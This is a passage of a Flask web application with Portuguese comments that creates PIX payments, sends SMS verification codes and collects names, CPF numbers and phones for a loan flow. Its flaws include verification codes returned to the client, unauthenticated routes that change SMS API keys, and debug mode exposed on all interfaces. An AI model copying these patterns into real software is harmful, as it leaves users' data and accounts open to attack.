        # Verificar campos específicos
        if 'email' not in data or not data['email']:
            data['email'] = generate_random_email(data['name'])
        
        # Criar instância da API
        api = get_payment_gateway()
        
        # Criar pagamento PIX
        pix_data = api.create_pix_payment(data)
        
        # Log dos dados PIX recebidos
        app.logger.info(f"[PROD] For4Payments: Dados PIX recebidos: {pix_data}")
        
        # Retornar os dados do PIX
        return jsonify(pix_data)
        
    except ValueError as e:
        app.logger.error(f"[PROD] For4Payments: Erro de validação: {str(e)}")
        return jsonify({'error': str(e)}), 400
        
    except Exception as e:
        app.logger.error(f"[PROD] For4Payments: Erro ao criar pagamento PIX: {str(e)}")
        return jsonify({'error': f'Erro ao criar pagamento PIX: {str(e)}'}), 500

@app.route('/check-for4payments-status', methods=['GET'])
@check_referer
def check_for4payments_status():
    # Obter ID da transação
    transaction_id = request.args.get('id')
    if not transaction_id:
        return jsonify({'error': 'ID da transação não fornecido'}), 400
    
    try:
        app.logger.info(f"[PROD] For4Payments: Verificando status do pagamento {transaction_id}")
        
        # Criar instância da API
        api = get_payment_gateway()
        
        # Verificar status
        status_data = api.check_payment_status(transaction_id)
        
        app.logger.info(f"[PROD] For4Payments: Status do pagamento {transaction_id}: {status_data}")
        
        # Retornar os dados de status
        return jsonify(status_data)
        
    except Exception as e:
        app.logger.error(f"[PROD] For4Payments: Erro ao verificar status: {str(e)}")
        return jsonify({'error': f'Erro ao verificar status: {str(e)}'}), 500

@app.route('/send-verification-code', methods=['POST'])
@check_referer
def send_verification_code_route():
    try:
        # Obter número de telefone do formulário
        data = request.get_json()
        if not data or 'phone' not in data:
            return jsonify({'success': False, 'error': 'Número de telefone não fornecido'}), 400
        
        phone_number = data['phone']
        
        # Limpar o número (manter apenas dígitos)
        clean_phone = re.sub(r'\D', '', phone_number)
        
        # Validar telefone
        if len(clean_phone) < 10 or len(clean_phone) > 11:
            return jsonify({'success': False, 'error': 'Número de telefone inválido'}), 400
        
        # Enviar código de verificação
        success, result = send_verification_code(clean_phone)
        
        if success:
            # Se sucesso, result contém o código
            return jsonify({'success': True, 'code': result})
        else:
            # Se falha, result contém a mensagem de erro
            return jsonify({'success': False, 'error': result}), 400
            
    except Exception as e:
        app.logger.error(f"Erro ao enviar código de verificação: {str(e)}")
        return jsonify({'success': False, 'error': f'Erro interno: {str(e)}'}), 500

@app.route('/atualizar-cadastro', methods=['GET', 'POST'])
@check_referer
def atualizar_cadastro():
    if request.method == 'POST':
        # Processar formulário
        nome = request.form.get('nome', '').strip()
        cpf = request.form.get('cpf', '').strip()
        phone = request.form.get('phone', '').strip()
        
        # Limpar CPF e telefone
        cpf_limpo = re.sub(r'\D', '', cpf)
        phone_limpo = re.sub(r'\D', '', phone)
        
        # Validações básicas
        errors = []
        if not nome or len(nome.split()) < 2:
            errors.append("Nome completo é obrigatório.")
        
        if len(cpf_limpo) != 11:
            errors.append("CPF inválido. Digite os 11 dígitos.")
            
        if len(phone_limpo) < 10:
            errors.append("Telefone inválido. Digite o DDD + número.")
        
        # Se houver erros, retornar o formulário com as mensagens
        if errors:
            return render_template('atualizar_cadastro.html', 
                                  nome=nome, 
                                  cpf=cpf, 
                                  phone=phone, 
                                  errors=errors)
        
        # Se tudo estiver ok, redirecionar para a próxima página
        # Neste exemplo, vou redirecionar para a página de opções de empréstimo
        return redirect(url_for('opcoes_emprestimo', 
                               nome=nome, 
                               cpf=cpf_limpo, 
                               phone=phone_limpo))
    
    # Exibir formulário
    return render_template('atualizar_cadastro.html')

@app.route('/sms-config', methods=['GET'])
def sms_config():
    # Obter configurações atuais
    current_api = os.environ.get('SMS_API', 'SMSDEV')
    smsdev_key = os.environ.get('SMSDEV_API_KEY', '')
    owen_token = os.environ.get('OWEN_SMS_TOKEN', '')
    owen_sender = os.environ.get('OWEN_SMS_SENDER_ID', 'INFO')
    
    # Mascarar as chaves por segurança
    if smsdev_key:
        smsdev_key = smsdev_key[:4] + '*' * (len(smsdev_key) - 8) + smsdev_key[-4:]
    
    if owen_token:
        owen_token = owen_token[:4] + '*' * (len(owen_token) - 8) + owen_token[-4:]
    
    return render_template('sms_config.html', 
                          current_api=current_api,
                          smsdev_key=smsdev_key,
                          owen_token=owen_token,
                          owen_sender=owen_sender)

@app.route('/update-sms-config', methods=['POST'])
def update_sms_config():
    # Obter dados do formulário
    sms_api = request.form.get('sms_api', 'SMSDEV')
    smsdev_key = request.form.get('smsdev_key', '')
    owen_token = request.form.get('owen_token', '')
    owen_sender = request.form.get('owen_sender', 'INFO')
    
    # Validar campos obrigatórios
    errors = []
    if sms_api == 'SMSDEV' and not smsdev_key:
        errors.append("API Key SMSDEV é obrigatória quando SMSDEV é selecionado.")
    
    if sms_api == 'OWEN' and not owen_token:
        errors.append("Token Owen SMS é obrigatório quando Owen SMS é selecionado.")
    
    # Se houver erros, retornar ao formulário
    if errors:
        return render_template('sms_config.html', 
                              current_api=sms_api,
                              smsdev_key=smsdev_key,
                              owen_token=owen_token,
                              owen_sender=owen_sender,
                              errors=errors)
    
    # Atualizar as variáveis de ambiente (em memória)
    os.environ['SMS_API'] = sms_api
    
    if smsdev_key:
        os.environ['SMSDEV_API_KEY'] = smsdev_key
    
    if owen_token:
        os.environ['OWEN_SMS_TOKEN'] = owen_token
    
    if owen_sender:
        os.environ['OWEN_SMS_SENDER_ID'] = owen_sender
    
    app.logger.info(f"Configurações de SMS atualizadas. API: {sms_api}")
    
    # Redirecionar com mensagem de sucesso
    return render_template('sms_config.html', 
                          current_api=sms_api,
                          smsdev_key=smsdev_key[:4] + '*' * (len(smsdev_key) - 8) + smsdev_key[-4:] if smsdev_key else '',
                          owen_token=owen_token[:4] + '*' * (len(owen_token) - 8) + owen_token[-4:] if owen_token else '',
                          owen_sender=owen_sender,
                          success="Configurações atualizadas com sucesso.")

@app.route('/send-test-sms', methods=['POST'])
def send_test_sms():
    # Obter número de telefone
    phone = request.form.get('test_phone', '')
    
    # Limpar o número (manter apenas dígitos)
    clean_phone = re.sub(r'\D', '', phone)
    
    # Validar telefone
    if len(clean_phone) < 10 or len(clean_phone) > 11:
        return render_template('sms_config.html', 
                              test_error="Número de telefone inválido para teste.")
    
    # Enviar SMS de teste
    message = "[TESTE] Esta é uma mensagem de teste do sistema. Configuração de SMS funcionando corretamente."
    
    # Determinar qual API usar
    sms_api = os.environ.get('SMS_API', 'SMSDEV').upper()
    
    if sms_api == 'SMSDEV':
        success = send_sms_smsdev(clean_phone, message)
    else:
        success = send_sms_owen(clean_phone, message)
    
    if success:
        return render_template('sms_config.html', 
                              test_success=f"SMS de teste enviado com sucesso para {clean_phone}.")
    else:
        return render_template('sms_config.html', 
                              test_error=f"Falha ao enviar SMS de teste para {clean_phone}. Verifique as configurações e tente novamente.")

# Inicialização da aplicação
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)